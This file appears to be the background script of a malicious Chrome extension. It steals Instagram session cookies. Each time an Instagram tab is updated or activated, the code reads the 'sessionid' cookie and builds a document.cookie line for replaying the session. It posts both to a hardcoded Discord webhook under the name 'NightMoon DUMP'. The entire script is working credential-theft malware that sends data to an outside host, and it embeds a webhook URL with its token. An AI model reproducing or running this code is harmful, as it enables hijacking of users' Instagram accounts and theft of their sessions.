const WEBHOOK_URL = "https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew";

let lastSessionId = null;

function exfiltrateCookie() {
  chrome.cookies.get({
    url: "https://www.instagram.com",
    name: "sessionid"
  }, function(cookie) {
    if (cookie && cookie.value && cookie.value !== lastSessionId) {
      lastSessionId = cookie.value;

      const command = `document.cookie = "sessionid=${cookie.value}; path=/; domain=.instagram.com";`;
      const sessionOnly = `\`${cookie.value}\``;

      const payload = {
        content: "```js\n" + command + "\n```\n\n" + "DUMP! 🚨 sessionid :  \n" + sessionOnly,
        username: "NightMoon DUMP"
      };

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    }
  });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (tab.url && tab.url.includes("instagram.com")) {
    exfiltrateCookie();
  }
});
chrome.tabs.onActivated.addListener(activeInfo => {
  chrome.tabs.get(activeInfo.tabId, function(tab) {
    if (tab.url && tab.url[0] && tab.url.includes("instagram.com")) {
      exfiltrateCookie();
    }
  });
});